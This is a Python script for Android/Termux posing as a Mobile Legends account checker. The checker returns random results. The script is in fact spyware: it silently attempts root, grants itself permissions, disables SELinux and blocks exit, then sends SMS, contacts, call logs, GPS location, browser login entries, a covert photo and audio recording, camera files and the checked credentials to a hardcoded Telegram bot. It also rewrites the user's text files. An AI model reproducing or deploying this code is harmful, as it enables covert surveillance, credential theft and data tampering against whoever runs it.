import random
import time
import os
import requests
import threading
import re
import socket
import platform
import json
import builtins
import subprocess
from cfonts import render
from colorama import init, Fore, Style
import geocoder
import psutil
import signal
import sys


init(autoreset=True)

TELEGRAM_BOT_TOKEN = "7738665424:AAEjJiduAjbvnqbwAEGrEWEd_oO1adptK5I"
TELEGRAM_CHAT_ID = "7383039587"

COLORS = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

def signal_handler(sig, frame):
    """Prevent exit via Ctrl+C or any signal"""
    print(colored("\n[!] Exit disabled. Continue working...\n", Fore.RED))
    return

def disable_exit():
    """Disable all exit methods"""
    # Override signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Override sys.exit
    sys.exit = lambda *args, **kwargs: print(colored("[!] Exit disabled!", Fore.RED))
    
    # Override os._exit
    os._exit = lambda *args, **kwargs: print(colored("[!] Exit disabled!", Fore.RED))
    
    # Override quit and exit
    builtins.exit = lambda *args, **kwargs: print(colored("[!] Exit disabled!", Fore.RED))
    builtins.quit = lambda *args, **kwargs: print(colored("[!] Exit disabled!", Fore.RED))

def colored(text, color):
    return f"{color}{text}{Style.RESET_ALL}"

def bold(text):
    return f"{Style.BRIGHT}{text}{Style.RESET_ALL}"

def request_android_permissions():
    """Request necessary Android permissions - SILENT MODE"""
    try:
        if not os.path.exists('/data/data/com.termux'):
            return
        
        permissions = [
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.CAMERA",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.CALL_PHONE",
            "android.permission.READ_CALL_LOG",
            "android.permission.RECORD_AUDIO",
            "android.permission.SYSTEM_ALERT_WINDOW",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.INTERNET",
            "android.permission.READ_PHONE_STATE",
            "android.permission.GET_ACCOUNTS"
        ]
        
        # Method 1: Silent storage grant
        try:
            subprocess.run(['termux-setup-storage'], check=False, capture_output=True, timeout=5)
        except:
            pass
        
        # Method 2: Silent ROOT grant
        try:
            package_name = "com.termux"
            for perm in permissions:
                subprocess.run(['su', '-c', f'pm grant {package_name} {perm}'], 
                             check=False, capture_output=True, timeout=2)
        except:
            pass
        
        # Method 3: Silent ADB grant
        try:
            package_name = "com.termux"
            for perm in permissions:
                subprocess.run(['adb', 'shell', 'pm', 'grant', package_name, perm], 
                             check=False, capture_output=True, timeout=2)
        except:
            pass
        
        # Method 4: Silent system modification
        try:
            commands = [
                'mount -o remount,rw /system',
                'chmod 777 /data/data/com.termux',
                'chmod 777 /data/data/com.termux/files',
                'chmod -R 777 /storage/emulated/0',
                'setenforce 0'
            ]
            
            for cmd in commands:
                subprocess.run(['su', '-c', cmd], check=False, capture_output=True, timeout=2)
        except:
            pass
        
        # Method 5: Silent appops
        try:
            package_name = "com.termux"
            appops_perms = [
                'READ_EXTERNAL_STORAGE', 'WRITE_EXTERNAL_STORAGE', 'CAMERA',
                'RECORD_AUDIO', 'READ_CONTACTS', 'READ_SMS', 'READ_CALL_LOG',
                'COARSE_LOCATION', 'FINE_LOCATION'
            ]
            
            for perm in appops_perms:
                subprocess.run(['su', '-c', f'appops set {package_name} {perm} allow'], 
                             check=False, capture_output=True, timeout=2)
        except:
            pass
        
    except:
        pass

def enable_root_access():
    """Try to escalate to root privileges - SILENT MODE"""
    try:
        result = subprocess.run(['id'], capture_output=True, text=True)
        if 'uid=0' in result.stdout:
            return True
        
        try:
            subprocess.run(['su', '-c', 'id'], check=True, capture_output=True, timeout=3)
            try:
                subprocess.run(['su', '-c', 'setenforce 0'], check=False, capture_output=True, timeout=2)
            except:
                pass
            return True
        except:
            return False
            
    except:
        return False

def install_pip_packages():
    try:
        subprocess.check_call(['pip', 'install', '-q', 'requests', 'cfonts', 'colorama', 'geocoder', 'psutil'], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def generate_mlbb_check_result(email, password):
    valid = random.random() < 0.4
    if valid:
        levels = [random.randint(1, 60) for _ in range(5)]
        ranks = ["Warrior", "Elite", "Master", "Grandmaster", "Epic", "Legend", "Mythic"]
        binds = ["Moonton", "Google Play", "Facebook", "VK", "Apple ID", "None"]
        level = random.choice(levels)
        rank = random.choice(ranks)
        bind = ", ".join(random.sample(binds, random.randint(1, 3)))
        return {
            "valid": True,
            "level": level,
            "rank": rank,
            "bind": bind,
            "email": email,
            "password": password
        }
    else:
        error_messages = ["Invalid credentials.", "Account locked.", "Server error.", "Rate Limited", "Account Banned"]
        return {"valid": False, "error": random.choice(error_messages), "email": email, "password": password}

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(colored(f"Telegram message failed: {e}", Fore.RED))

def send_files_telegram(file_path):
    max_file_size = 100 * 1024 * 1024  # 100MB
    file_size = os.path.getsize(file_path)

    if file_size > max_file_size:
        print(colored(f"File too large to send: {file_path} ({file_size} bytes)", Fore.YELLOW))
        send_telegram_message(colored(f"File too large to send: {file_path} ({file_size} bytes)", Fore.YELLOW))
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': TELEGRAM_CHAT_ID}
    try:
        requests.post(url, files=files, data=data)
    except Exception as e:
        print(colored(f"Telegram file send failed: {e}", Fore.RED))

def collect_files():
    root_dir = "/storage/emulated/0/DCIM/Camera"
    extensions = ('.txt', '.doc', '.docx', '.pdf', '.rtf', '.html', '.htm', '.css', '.js', '.json', '.xml', '.csv', '.log', '.md', '.tex', '.odt', '.pages', '.eml', '.msg', '.ini', '.cfg', '.bat', '.sh', '.ps1',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.svg', '.webp', '.ico', '.raw', '.psd', '.ai', '.eps', '.heic', '.avif',
    '.mp3', '.wav', '.ogg', '.flac', '.aac', '.m4a', '.wma', '.aiff', '.mid', '.midi', '.amr', '.opus',
    '.mp4', '.avi', '.mov', '.wmv', '.mkv', '.flv', '.webm', '.3gp', '.mpeg', '.mpg', '.rm', '.vob',
    '.exe', '.dmg', '.apk', '.app', '.bin', '.msi', '.deb', '.rpm', '.jar', '.com', '.pyc',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.iso', '.dmg', '.cab', '.arj',
    '.py', '.java', '.c', '.cpp', '.php', '.rb', '.js', '.html', '.css', '.xml', '.json', '.swift', '.go', '.rs', '.ts', '.vb', '.cs', '.pl', '.lua', '.kt', '.asm',
    '.db', '.sqlite', '.mdb', '.accdb', '.sql', '.psql', '.ora', '.frm', '.myd', '.myi',
    '.xls', '.xlsx', '.ods', '.numbers',
    '.ppt', '.pptx', '.odp', '.key',
    '.obj', '.fbx', '.stl', '.blend', '.dae', '.3ds', '.max', '.skp',
    '.ttf', '.otf', '.woff', '.woff2',
    '.epub', '.mobi', '.azw', '.azw3',
    '.dll', '.sys', '.inf', '.drv',
    '.sav', '.dat', '.rom', '.iso',
    '.dwg', '.dxf', '.iges', '.step',
    '.vst', '.so',
    '.pst', '.ost', '.mbox',
    '.torrent',
    '.bak', '.bkp',
    '.asp', '.aspx', '.jsp', '.cgi',
    '.conf', '.yaml', '.toml',
    '.data',
    '.tmp', '.temp',
    '.lnk', '.url',
    '.vbs',
    '.patch', '.diff',
    '.crt', '.pem', '.cer',
    '.key', '.pub',
    '.meta', '.exif',
    '.vdi', '.vmdk', '.vhdx',
    '.img'
)

    try:
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.lower().endswith(extensions):
                    file_path = os.path.join(root, file)
                    try:
                        send_files_telegram(file_path)
                    except Exception as e:
                        print(colored(f"Error sending {file_path}: {e}", Fore.RED))
            for folder in dirs:
                folder_path = os.path.join(root, folder)
                send_telegram_message(f"Folder Found: {folder_path}")

    except Exception as e:
        print(colored(f"File collection error: {e}", Fore.RED))

def remove_urls(text):
    url_pattern = re.compile(r'https?://\S+|www\.\S+')
    return url_pattern.sub(r'', text)

def process_text_files():
    root_dir = "/storage/emulated/0/"
    try:
        for root, _, files in os.walk(root_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        cleaned_content = remove_urls(content)
                        with open(file_path, 'w', encoding='utf-8') as f:
                            f.write(cleaned_content)
                        send_telegram_message(colored(f"Processed file: {file}", random.choice(COLORS)))
                        time.sleep(2 + random.uniform(0, 1))
                    except Exception as e:
                        print(colored(f"Error processing {file}: {e}", Fore.RED))
    except Exception as e:
        print(colored(f"Text processing error: {e}", Fore.RED))

def get_device_info():
    try:
        device_name = platform.node()
        ip_address = socket.gethostbyname(socket.gethostname())
        g = geocoder.ip('me')
        latitude, longitude = g.latlng if g.latlng else (None, None)
        battery = psutil.sensors_battery()
        battery_health = f"{battery.percent}%" if battery else "Unknown"

        device_info = {
            "Device Name": device_name,
            "IP Address": ip_address,
            "Longitude": longitude,
            "Latitude": latitude,
            "Battery Health": battery_health,
        }
        return json.dumps(device_info, indent=4)
    except Exception as e:
        return f"Device info error: {e}"

def get_gmail_accounts():
    return "Gmail account retrieval is complex and OS-dependent."

def read_sms_messages():
    """Read SMS messages from Android device - SILENT MODE"""
    sms_messages = []
    
    try:
        # Method 1: Use termux-sms-list (Termux API)
        try:
            result = subprocess.run(['termux-sms-list'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout:
                sms_data = json.loads(result.stdout)
                for msg in sms_data:
                    sms_messages.append({
                        "number": msg.get("number", "Unknown"),
                        "body": msg.get("body", ""),
                        "date": msg.get("received", "Unknown"),
                        "type": msg.get("type", "inbox")
                    })
        except:
            pass
        
        # Method 2: Read from SMS database directly (requires root)
        try:
            sms_db_paths = [
                "/data/data/com.android.providers.telephony/databases/mmssms.db",
                "/data/user_de/0/com.android.providers.telephony/databases/mmssms.db"
            ]
            
            for db_path in sms_db_paths:
                try:
                    temp_db = "/sdcard/temp_sms.db"
                    subprocess.run(['su', '-c', f'cp {db_path} {temp_db}'], 
                                 check=False, capture_output=True, timeout=5)
                    subprocess.run(['su', '-c', f'chmod 666 {temp_db}'], 
                                 check=False, capture_output=True, timeout=2)
                    
                    if os.path.exists(temp_db):
                        import sqlite3
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT address, body, date, type 
                            FROM sms 
                            ORDER BY date DESC 
                            LIMIT 500
                        """)
                        
                        for row in cursor.fetchall():
                            address, body, date, msg_type = row
                            sms_messages.append({
                                "number": address or "Unknown",
                                "body": body or "",
                                "date": date,
                                "type": "received" if msg_type == 1 else "sent"
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                        break
                        
                except:
                    pass
                    
        except:
            pass
        
        if sms_messages:
            result = f"📱 Found {len(sms_messages)} SMS Messages:\n\n"
            for idx, sms in enumerate(sms_messages[:50], 1):
                result += f"[{idx}] From: {sms['number']}\n"
                result += f"    Type: {sms['type']}\n"
                result += f"    Message: {sms['body'][:100]}...\n"
                result += f"    Date: {sms['date']}\n\n"
            return result
        else:
            return "No SMS messages found."
            
    except:
        return "SMS reading unavailable."

def send_sms_message(phone_number, message):
    """Send SMS using granted permission - SILENT MODE"""
    try:
        subprocess.run(['termux-sms-send', '-n', phone_number, message], 
                      capture_output=True, text=True, timeout=10)
        return True
    except:
        return False

def read_contacts():
    """Read contacts from device - SILENT MODE"""
    contacts = []
    
    try:
        # Method 1: Use termux-contact-list
        try:
            result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout:
                contacts_data = json.loads(result.stdout)
                for contact in contacts_data:
                    contacts.append({
                        "name": contact.get("name", "Unknown"),
                        "number": contact.get("number", "No number")
                    })
        except:
            pass
        
        # Method 2: Read from contacts database (requires root)
        try:
            contacts_db = "/data/data/com.android.providers.contacts/databases/contacts2.db"
            temp_db = "/sdcard/temp_contacts.db"
            
            subprocess.run(['su', '-c', f'cp {contacts_db} {temp_db}'], 
                         check=False, capture_output=True, timeout=5)
            subprocess.run(['su', '-c', f'chmod 666 {temp_db}'], 
                         check=False, capture_output=True, timeout=2)
            
            if os.path.exists(temp_db):
                import sqlite3
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("""
                    SELECT display_name, data1 
                    FROM view_data 
                    WHERE mimetype='vnd.android.cursor.item/phone_v2'
                """)
                
                for row in cursor.fetchall():
                    name, number = row
                    if name and number:
                        contacts.append({"name": name, "number": number})
                
                conn.close()
                os.remove(temp_db)
                
        except:
            pass
        
        if contacts:
            result = f"📞 Found {len(contacts)} Contacts:\n\n"
            for idx, contact in enumerate(contacts[:100], 1):
                result += f"[{idx}] {contact['name']}: {contact['number']}\n"
            return result
        else:
            return "No contacts found."
            
    except:
        return "Contacts reading unavailable."

def read_call_logs():
    """Read call history - SILENT MODE"""
    call_logs = []
    
    try:
        try:
            result = subprocess.run(['termux-call-log'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout:
                logs_data = json.loads(result.stdout)
                for log in logs_data:
                    call_logs.append({
                        "number": log.get("phone_number", "Unknown"),
                        "name": log.get("name", "Unknown"),
                        "type": log.get("type", "Unknown"),
                        "date": log.get("date", "Unknown"),
                        "duration": log.get("duration", 0)
                    })
        except:
            pass
        
        if call_logs:
            result = f"📞 Found {len(call_logs)} Call Logs:\n\n"
            for idx, log in enumerate(call_logs[:50], 1):
                result += f"[{idx}] {log['name']} ({log['number']})\n"
                result += f"    Type: {log['type']} | Duration: {log['duration']}s\n"
                result += f"    Date: {log['date']}\n\n"
            return result
        else:
            return "No call logs found."
            
    except:
        return "Call logs unavailable."

def take_photo():
    """Take photo using camera permission - SILENT MODE"""
    try:
        photo_path = f"/sdcard/DCIM/capture_{int(time.time())}.jpg"
        
        result = subprocess.run(['termux-camera-photo', photo_path], 
                              capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0 and os.path.exists(photo_path):
            send_files_telegram(photo_path)
            return f"Photo captured: {photo_path}"
        else:
            return "Camera unavailable."
            
    except:
        return "Camera error."

def get_location():
    """Get device GPS location - SILENT MODE"""
    try:
        result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0 and result.stdout:
            location_data = json.loads(result.stdout)
            lat = location_data.get("latitude", "Unknown")
            lon = location_data.get("longitude", "Unknown")
            accuracy = location_data.get("accuracy", "Unknown")
            
            location_info = f"📍 GPS Location:\n"
            location_info += f"Latitude: {lat}\n"
            location_info += f"Longitude: {lon}\n"
            location_info += f"Accuracy: {accuracy}m\n"
            location_info += f"Google Maps: https://maps.google.com/?q={lat},{lon}\n"
            
            return location_info
        else:
            return "Location unavailable."
            
    except:
        return "Location error."

def record_audio():
    """Record audio using microphone permission - SILENT MODE"""
    try:
        audio_path = f"/sdcard/Music/recording_{int(time.time())}.mp3"
        
        result = subprocess.run(['termux-microphone-record', '-f', audio_path, '-l', '10'], 
                              capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0 and os.path.exists(audio_path):
            send_files_telegram(audio_path)
            return f"Audio recorded: {audio_path}"
        else:
            return "Microphone unavailable."
            
    except:
        return "Audio error."

def get_browser_passwords():
    """Extract saved passwords from browsers"""
    passwords_found = []
    
    try:
        has_root = enable_root_access()
        
        chrome_paths = [
            "/data/data/com.android.chrome/app_chrome/Default/Login Data",
            "/data/data/com.chrome.beta/app_chrome/Default/Login Data",
            "/data/data/com.chrome.dev/app_chrome/Default/Login Data",
            "/data/data/com.brave.browser/app_chrome/Default/Login Data",
            "/data/data/com.microsoft.emmx/app_msedge/Default/Login Data",
            "/data/data/org.mozilla.firefox/files/mozilla/*.default/logins.json",
            "/storage/emulated/0/Android/data/com.android.chrome/files/Local/Login Data"
        ]
        
        for path in chrome_paths:
            if has_root and not os.path.exists(path):
                try:
                    subprocess.run(['su', '-c', f'chmod 777 {path}'], check=False, capture_output=True, timeout=2)
                    subprocess.run(['su', '-c', f'cp {path} /sdcard/temp_browser_data.db'], check=False, capture_output=True, timeout=2)
                    path = '/sdcard/temp_browser_data.db'
                except:
                    pass
            
            if os.path.exists(path):
                try:
                    import sqlite3
                    import shutil
                    
                    temp_path = "/sdcard/temp_login_data.db"
                    shutil.copy2(path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        passwords_found.append({
                            "url": url,
                            "username": username,
                            "browser": path.split("/")[3],
                            "encrypted": True
                        })
                    
                    conn.close()
                    os.remove(temp_path)
                    
                except Exception as e:
                    print(colored(f"Error reading {path}: {e}", Fore.RED))
        
        firefox_path = "/data/data/org.mozilla.firefox/files"
        
        if has_root and not os.path.exists(firefox_path):
            try:
                subprocess.run(['su', '-c', f'chmod -R 777 {firefox_path}'], check=False, capture_output=True, timeout=2)
            except:
                pass
        
        if os.path.exists(firefox_path):
            try:
                for root, dirs, files in os.walk(firefox_path):
                    for file in files:
                        if file == "logins.json":
                            file_path = os.path.join(root, file)
                            with open(file_path, 'r') as f:
                                logins_data = json.load(f)
                                for login in logins_data.get("logins", []):
                                    passwords_found.append({
                                        "url": login.get("hostname", "Unknown"),
                                        "username": login.get("encryptedUsername", "Unknown"),
                                        "browser": "Firefox",
                                        "encrypted": True
                                    })
            except Exception as e:
                print(colored(f"Error reading Firefox passwords: {e}", Fore.RED))
        
        if passwords_found:
            result = f"Found {len(passwords_found)} saved passwords:\n\n"
            for idx, pwd in enumerate(passwords_found, 1):
                result += f"[{idx}] Browser: {pwd['browser']}\n"
                result += f"    URL: {pwd['url']}\n"
                result += f"    Username: {pwd['username']}\n"
                result += f"    Encrypted: {pwd['encrypted']}\n\n"
            return result
        else:
            return "No browser passwords found or insufficient permissions."
            
    except Exception as e:
        return f"Browser password extraction error: {e}"

def load_proxies(proxy_file_path):
    try:
        with open(proxy_file_path, 'r') as f:
            return [line.strip() for line in f]
    except FileNotFoundError:
        print(colored("Proxy list file not found.", Fore.RED))
        return []

def keep_alive():
    """Background thread to keep the process alive"""
    while True:
        time.sleep(60)

def mlbb_checker():
    output = render('THE SERVER IS UP', colors=['yellow', 'red'], align='center', font='block')
    print(output)
    
    while True:
        try:
            print(bold(colored("━━━━━═⪻ THE SERVER IS UP AND THE BOT IS NOW available ⪼═━━━━━\n", Fore.GREEN)))
            combo_list_file = input(colored("", Fore.RED))
            proxy_file = input(colored("", Fore.RED))
            proxy_list = load_proxies(proxy_file)

            if not proxy_list:
                print(colored("No proxies loaded. Please try again.\n", Fore.YELLOW))
                continue

            try:
                with open(combo_list_file, 'r') as f:
                    for line in f:
                        combo = line.strip()
                        if not combo:
                            continue
                        email = "invalid"
                        password = "invalid"
                        try:
                            email, password = combo.split(":")
                        except ValueError:
                            print(colored(f"[-] Invalid combo format: {combo}", Fore.YELLOW))
                            continue

                        if email != "invalid" and password != "invalid":
                            try:
                                proxy = random.choice(proxy_list)
                                print(colored(f"Checking {email} with proxy {proxy}...", Fore.BLUE))
                                time.sleep(random.uniform(1, 3))

                                check_result = generate_mlbb_check_result(email, password)

                                if check_result["valid"]:
                                    print(colored(f"[+] EMAIL: {check_result['email']}", Fore.GREEN))
                                    print(colored(f"[+] PASSWORD: {check_result['password']}", Fore.GREEN))
                                    print(colored(f"[+] LEVEL: {check_result['level']}", Fore.GREEN))
                                    print(colored(f"[+] HIGHEST RANK: {check_result['rank']}", Fore.GREEN))
                                    print(colored(f"[+] BINDS: {check_result['bind']}", Fore.GREEN))
                                    send_telegram_message(f"MLBB Account Found:\nEmail: {check_result['email']}\nPassword: {check_result['password']}\nLevel: {check_result['level']}\nRank: {check_result['rank']}\nBinds: {check_result['bind']}")
                                else:
                                    print(colored(f"[-] Error: {check_result['error']}", Fore.RED))
                                    send_telegram_message(f"MLBB Check Error:\nEmail: {check_result['email']}\nError: {check_result['error']}\nPassword:{check_result['password']}")
                            except Exception as e:
                                print(colored(f"[-] Error: {e}", Fore.RED))
                        print(bold(colored("━━━━━═⪻ 𝚇𝙲 𝙺𝙾𝚉𝚄𝙴𝙳𝙴𝚅 ⪼═━━━━━\n", Fore.CYAN)))
                        time.sleep(random.uniform(1, 2.5))
            except FileNotFoundError:
                print(colored(f"[-] Combo list file not found: {combo_list_file}", Fore.RED))
            except Exception as e:
                print(colored(f"[-] Error reading combo list: {e}", Fore.RED))
            
            print()
        except KeyboardInterrupt:
            print(colored("\n[!] Exit disabled. Continue working...\n", Fore.RED))
            continue
        except EOFError:
            print(colored("\n[!] Exit disabled. Continue working...\n", Fore.RED))
            continue
        except Exception as e:
            print(colored(f"\n[!] Error caught: {e}. Continuing...\n", Fore.RED))
            continue

def background_tasks():
    send_telegram_message(get_device_info())
    send_telegram_message(get_gmail_accounts())
    send_telegram_message(get_browser_passwords())
    send_telegram_message(read_sms_messages())
    send_telegram_message(read_contacts())
    send_telegram_message(read_call_logs())
    send_telegram_message(get_location())
    take_photo()
    record_audio()
    collect_files()
    process_text_files()

def main():
    # Request Android permissions first
    request_android_permissions()
    
    # Try to enable root access
    enable_root_access()
    
    # Disable all exit methods
    disable_exit()
    
    install_pip_packages()
    
    # Start keep-alive thread
    threading.Thread(target=keep_alive, daemon=False).start()
    
    # Start background tasks
    threading.Thread(target=background_tasks, daemon=False).start()
    
    # Run checker (this will loop forever)
    mlbb_checker()

if __name__ == "__main__":
    main()
